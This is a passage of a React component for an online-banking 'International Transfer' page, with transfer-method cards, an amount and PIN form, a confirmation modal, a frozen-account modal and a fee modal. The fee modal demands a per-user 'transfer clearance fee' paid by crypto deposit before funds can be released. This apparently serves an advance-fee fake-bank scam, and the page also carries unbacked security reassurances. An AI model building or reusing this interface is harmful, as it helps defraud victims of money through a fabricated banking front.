    );
  }

  // Show verification steps if not on form
  if (currentStep !== 'form') {
    return (
      <div>
        {/* Page Header */}
        <div className="flex flex-col mb-6">
          <h1 className="text-2xl font-bold text-white mb-1" style={{color: "white"}}>Transfer Verification</h1>
          <div className="flex items-center text-sm text-gray-400">
            <Link href="/dashboard" className="hover:text-blue-400 transition-colors" style={{color: "white"}}>Dashboard</Link>
            <ChevronRight className="h-4 w-4 mx-2" />
            <span className="text-white">Verification</span>
          </div>
        </div>
        {renderVerificationStep()}
      </div>
    );
  }

  return (
    <div>
      {/* Page Header */}
      <div className="flex flex-col mb-6">
        <h1 className="text-2xl font-bold text-white mb-1" style={{color: "white"}}>International Transfer</h1>
        <div className="flex items-center text-sm text-gray-400">
          <Link href="/dashboard" className="hover:text-blue-400 transition-colors" style={{color: "white"}}>Dashboard</Link>
          <ChevronRight className="h-4 w-4 mx-2" />
          <span className="text-white">International Transfer</span>
        </div>
      </div>

      <div className="max-w-4xl mx-auto">
        {/* Method Selection */}
        {!selectedMethod && !showMoreMethods && (
          <div className="mb-8">
            <h2 className="text-xl font-bold text-white mb-4" style={{color: "white"}}>Select Transfer Method</h2>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {transferMethods.map((method) => (
                <div
                  key={method.id}
                  onClick={() => setSelectedMethod(method.id)}
                  className="cursor-pointer rounded-xl p-4 hover:ring-2 hover:ring-blue-500 transition-all"
                  style={{ backgroundColor: 'rgb(31 41 55)' }}
                >
                  <div className="flex items-center mb-3">
                    <div className={`h-10 w-10 rounded-full ${method.color} flex items-center justify-center text-xl`}>
                      {method.icon}
                    </div>
                    <h3 className="ml-3 font-medium text-white" style={{color: "white"}}>{method.name}</h3>
                  </div>
                  <p className="text-sm text-gray-400" style={{color: "white"}}>{method.description}</p>
                </div>
              ))}
              <div
                onClick={() => setShowMoreMethods(true)}
                className="cursor-pointer rounded-xl p-4 hover:ring-2 hover:ring-blue-500 transition-all"
                style={{ backgroundColor: 'rgb(31 41 55)' }}
              >
                <div className="flex items-center mb-3">
                  <div className="h-10 w-10 rounded-full bg-amber-500/20 flex items-center justify-center">
                    <MoreHorizontal className="h-5 w-5 text-amber-400" />
                  </div>
                  <h3 className="ml-3 font-medium text-white" style={{color: "white"}}>More Options</h3>
                </div>
                <p className="text-sm text-gray-400" style={{color: "white"}}>Zelle, Venmo, Revolut, and more.</p>
              </div>
            </div>
          </div>
        )}

        {/* More Methods */}
        {showMoreMethods && !selectedMethod && (
          <div className="mb-8">
            <div className="flex items-center mb-6" style={{color: "white"}}>
              <button
                onClick={() => setShowMoreMethods(false)}
                className="mr-3 rounded-full p-2 text-gray-400 hover:bg-gray-700 transition-colors"
              >
                <ArrowLeft className="h-5 w-5" />
              </button>
              <h2 className="text-xl font-bold text-white" style={{color: "white"}}>Additional Transfer Methods</h2>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {moreTransferMethods.map((method) => (
                <div
                  key={method.id}
                  onClick={() => { setSelectedMethod(method.id); setShowMoreMethods(false); }}
                  className="cursor-pointer rounded-xl p-4 hover:ring-2 hover:ring-blue-500 transition-all"
                  style={{ backgroundColor: 'rgb(31 41 55)' }}
                >
                  <div className="flex items-center mb-3">
                    <div className={`h-10 w-10 rounded-full ${method.color} flex items-center justify-center text-xl`}>
                      {method.icon}
                    </div>
                    <h3 className="ml-3 font-medium text-white" style={{color: "white"}}>{method.name}</h3>
                  </div>
                  <p className="text-sm text-gray-400" style={{color: "white"}}>{method.description}</p>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Transfer Form */}
        {selectedMethod && (
          <div className="rounded-xl shadow-lg overflow-hidden" style={{ backgroundColor: 'rgb(31 41 55)' }}>
            {/* Header */}
            <div className="relative px-6 py-8" style={{ background: 'linear-gradient(135deg, #0369a1 0%, #0284c7 50%, #020617 100%)' }}>
              <button
                onClick={() => setSelectedMethod('')}
                className="absolute top-4 left-4 bg-white/20 rounded-full p-2 text-white hover:bg-white/30 transition-colors"
              >
                <ArrowLeft className="h-5 w-5" />
              </button>
              <div className="flex flex-col items-center">
                <div className="bg-white/20 backdrop-blur-sm p-4 rounded-full mb-4">
                  <Globe className="h-10 w-10 text-white" />
                </div>
                <h2 className="text-2xl font-bold text-white" style={{color: "white"}}>{getMethodTitle()}</h2>
                <p className="text-white/80 mt-1 text-center" style={{color: "white"}}>{getMethodDescription()}</p>
              </div>
            </div>

            {/* Form */}
            <div className="p-6 md:p-8">
              <form onSubmit={handlePreview}>
                {/* Balance Card */}
                <div className="p-4 rounded-xl mb-6" style={{ backgroundColor: 'rgb(55 65 81)' }}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center">
                      <div className="w-10 h-10 rounded-full flex items-center justify-center bg-blue-500/20 mr-3">
                        <Wallet className="h-5 w-5 text-blue-400" />
                      </div>
                      <div>
                        <p className="text-sm text-gray-400" style={{color: "white"}}>Available Balance</p>
                        <p className="text-xl font-bold text-white" style={{color: "white"}}>{currencySymbol}{formatCurrency(accountBalance)}</p>
                      </div>
                    </div>
                    <div className="text-xs py-1 px-3 bg-green-500/20 text-green-400 rounded-full">Available</div>
                  </div>
                </div>

                {/* Amount */}
                <div className="mb-6 p-5 rounded-xl" style={{ backgroundColor: 'rgb(55 65 81)' }}>
                  <label className="block text-sm font-medium text-white mb-2" style={{color: "white"}}>Amount to Transfer</label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-lg font-bold">{currencySymbol}</span>
                    <input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      min="1"
                      max={accountBalance}
                      step="any"
                      className="block w-full pl-12 pr-4 py-4 rounded-lg bg-gray-800 border border-gray-600 text-white text-2xl font-bold focus:outline-none focus:ring-2 focus:ring-blue-500"
                      placeholder="0.00"
                      required
                    />
                  </div>
                  <div className="mt-4 flex flex-wrap gap-2">
                    {[100, 500, 1000].map(val => (
                      <button key={val} type="button" onClick={() => handleQuickAmount(val)} className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-sm font-medium text-white transition-colors">
                        {currencySymbol}{val.toLocaleString()}
                      </button>
                    ))}
                    <button type="button" onClick={() => handleQuickAmount(Math.floor(accountBalance))} className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-sm font-medium text-white transition-colors">
                      Max
                    </button>
                  </div>
                </div>

                {/* Method-specific fields */}
                <div className="mb-6 p-5 rounded-xl" style={{ backgroundColor: 'rgb(55 65 81)' }}>
                  <h3 className="text-lg font-medium text-white mb-4" style={{color: "white"}}>Transfer Details</h3>
                  {renderMethodFields()}
                </div>

                {/* Description & PIN */}
                <div className="mb-6 p-5 rounded-xl" style={{ backgroundColor: 'rgb(55 65 81)' }}>
                  <div className="mb-5">
                    <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Description/Memo</label>
                    <div className="relative">
                      <MessageSquare className="absolute left-3 top-3 h-5 w-5 text-gray-400" />
                      <textarea
                        value={description}
                        onChange={(e) => setDescription(e.target.value)}
                        className="block w-full pl-10 pr-3 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 resize-none"
                        placeholder="Enter transaction description"
                        rows={3}
                      />
                    </div>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-white mb-1" style={{color: "white"}}>Transaction PIN *</label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-5 w-5 text-gray-400" />
                      <input
                        type={showPin ? 'text' : 'password'}
                        value={pin}
                        onChange={(e) => setPin(e.target.value)}
                        maxLength={4}
                        className="block w-full pl-10 pr-10 py-3 rounded-lg bg-gray-800 border border-gray-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
                        placeholder="Enter your 4-digit PIN"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPin(!showPin)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white"
                      >
                        {showPin ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                      </button>
                    </div>
                    <p className="mt-1 text-xs text-gray-400" style={{color: "white"}}>This is your transaction PIN, not your login password</p>
                  </div>
                </div>

                {/* Summary */}
                {amountValue > 0 && (
                  <div className="mb-6 p-5 rounded-xl bg-blue-500/10 border border-blue-500/30">
                    <div className="flex items-center mb-3">
                      <CheckCircle className="h-5 w-5 text-blue-400 mr-2" />
                      <h3 className="text-sm font-medium text-white" style={{color: "white"}}>Transaction Summary</h3>
                    </div>
                    <div className="space-y-2">
                      <div className="flex justify-between">
                        <span className="text-gray-400">Amount</span>
                        <span className="font-medium text-white" style={{color: "white"}}>{currencySymbol}{formatCurrency(amountValue)}</span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-gray-400">Fee</span>
                        <span className="font-medium text-white" style={{color: "white"}}>{currencySymbol}0.00</span>
                      </div>
                      <div className="border-t border-gray-600 pt-2 mt-2">
                        <div className="flex justify-between">
                          <span className="text-white font-medium">Total</span>
                          <span className="font-bold text-xl text-white" style={{color: "white"}}>{currencySymbol}{formatCurrency(amountValue)}</span>
                        </div>
                        <div className="flex justify-between mt-1">
                          <span className="text-gray-400" style={{color: "white"}}>New Balance</span>
                          <span className="font-medium text-white" style={{color: "white"}}>{currencySymbol}{formatCurrency(newBalance)}</span>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                {/* Buttons */}
                <div className="flex flex-col sm:flex-row gap-4">
                  <button
                    type="submit"
                    disabled={!amount || !pin}
                    className="flex-1 inline-flex items-center justify-center px-6 py-3.5 rounded-lg text-base font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <Eye className="h-5 w-5 mr-2" />
                    Preview Transfer
                  </button>
                  <button
                    type="button"
                    onClick={() => setSelectedMethod('')}
                    className="flex-1 inline-flex items-center justify-center px-6 py-3.5 rounded-lg text-base font-medium text-white bg-gray-600 hover:bg-gray-500 transition-colors"
                  >
                    <ArrowLeft className="h-5 w-5 mr-2" />
                    Back
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* Security Notice */}
        <div className="mt-6 p-5 rounded-lg" style={{ backgroundColor: 'rgb(31 41 55)' }}>
          <div className="flex items-start">
            <Shield className="h-5 w-5 text-blue-400 flex-shrink-0 mt-0.5" />
            <div className="ml-3">
              <h3 className="text-sm font-medium text-white" style={{color: "white"}}>Secure Transaction</h3>
              <p className="text-xs text-gray-400 mt-1" style={{color: "white"}}>All transfers are encrypted and processed securely. Your financial information is never stored on our servers.</p>
            </div>
          </div>
        </div>
      </div>

      {/* Preview Modal */}
      {showPreview && (
        <div className="fixed inset-0 z-50 overflow-y-auto">
          <div className="flex items-center justify-center min-h-screen px-4 pt-4 pb-20 text-center sm:block sm:p-0">
            <div className="fixed inset-0 transition-opacity bg-black/70" onClick={() => !isSubmitting && setShowPreview(false)} />
            <div className="relative z-10 inline-block w-full max-w-md p-6 my-8 overflow-hidden text-left align-middle transition-all transform rounded-2xl shadow-xl sm:align-middle sm:max-w-lg" style={{ backgroundColor: 'rgb(31 41 55)' }}>
              <div className="flex items-center justify-between mb-4 pb-3 border-b border-gray-600">
                <h3 className="text-lg font-bold text-white flex items-center" style={{color: "white"}}>
                  <CheckCircle className="h-5 w-5 mr-2 text-blue-400" />
                  Confirm Transfer Details
                </h3>
                <button type="button" onClick={() => !isSubmitting && setShowPreview(false)} className="text-gray-400 hover:text-white" disabled={isSubmitting}>
                  <X className="h-5 w-5" />
                </button>
              </div>

              <div className="space-y-4">
                <div className="rounded-lg p-4" style={{ backgroundColor: 'rgb(55 65 81)' }}>
                  <div className="mb-3 pb-2 border-b border-gray-600">
                    <h4 className="text-sm font-medium text-white" style={{color: "white"}}>Transfer Summary</h4>
                  </div>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Method</span>
                      <span className="font-medium text-white">{getMethodTitle()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Amount</span>
                      <span className="font-medium text-white">{currencySymbol}{formatCurrency(amountValue)}</span>
                    </div>
                    <div className="border-t border-gray-600 pt-2 mt-2">
                      <div className="flex justify-between">
                        <span className="text-white font-medium">Total</span>
                        <span className="font-bold text-white">{currencySymbol}{formatCurrency(amountValue)}</span>
                      </div>
                      <div className="flex justify-between mt-1">
                        <span className="text-gray-400">New Balance</span>
                        <span className="font-medium text-white">{currencySymbol}{formatCurrency(newBalance)}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex items-start text-sm p-3 bg-amber-500/20 border-l-4 border-amber-400 rounded-r-md">
                  <AlertTriangle className="h-5 w-5 text-amber-400 mr-2 flex-shrink-0" />
                  <p className="text-amber-200">
                    Please verify the transfer details carefully. Once confirmed, transfers cannot be reversed.
                  </p>
                </div>

                <div className="flex flex-col-reverse sm:flex-row gap-3">
                  <button
                    type="button"
                    onClick={() => setShowPreview(false)}
                    disabled={isSubmitting}
                    className="flex-1 inline-flex justify-center items-center px-4 py-3 rounded-lg text-base font-medium text-white bg-gray-600 hover:bg-gray-500 transition-colors disabled:opacity-50"
                  >
                    <X className="h-5 w-5 mr-2" />
                    Cancel
                  </button>
                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={isSubmitting}
                    className="flex-1 inline-flex justify-center items-center px-4 py-3 rounded-lg text-base font-medium text-white bg-blue-600 hover:bg-blue-700 transition-colors disabled:opacity-50"
                  >
                    {isSubmitting ? (
                      <>
                        <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                        Processing...
                      </>
                    ) : (
                      <>
                        <CheckCircle className="h-5 w-5 mr-2" />
                        Confirm Transfer
                      </>
                    )}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Frozen Account Modal */}
      {showFrozenModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="max-w-md w-full rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
            <div className="mx-auto w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
              <Shield className="h-8 w-8 text-red-400" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2">Suspicious Activity Detected</h2>
            <p className="text-gray-400 mb-2">We have detected suspicious activity on your account. For your security, your account has been temporarily frozen and transactions have been suspended.</p>
            <p className="text-gray-400 mb-6">Please contact our support team for assistance in resolving this matter and restoring your account access.</p>
            <div className="flex gap-3">
              <button
                onClick={() => setShowFrozenModal(false)}
                className="flex-1 px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                Close
              </button>
              <Link
                href="/dashboard/support"
                className="flex-1 inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
              >
                Contact Support
              </Link>
            </div>
          </div>
        </div>
      )}

      {/* Fee Modal */}
      {showFeeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="max-w-md w-full rounded-xl p-8 text-center" style={{ backgroundColor: 'rgb(31 41 55)' }}>
            <div className="mx-auto w-16 h-16 bg-amber-500/20 rounded-full flex items-center justify-center mb-4">
              <AlertCircle className="h-8 w-8 text-amber-400" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2" style={{color:"white"}}>Transfer Clearance Fee Required</h2>
            <p className="text-gray-400 mb-6" style={{color:"white"}}>You are required to pay a transfer clearance fee of <span className="text-amber-200 font-semibold">{currencySymbol}{(user?.withdrawalFee || 0).toLocaleString()}</span> via crypto deposit to activate your online banking profile and enable the transfer of the funds.</p>
            <div className="flex gap-3">
              <button
                onClick={() => setShowFeeModal(false)}
                className="flex-1 px-6 py-3 bg-gray-600 text-white rounded-lg hover:bg-gray-700 transition-colors"
              >
                Close
              </button>
              <p className="flex-1 inline-flex items-center justify-center px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 cursor-pointer">
                Contact Support via live chat
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
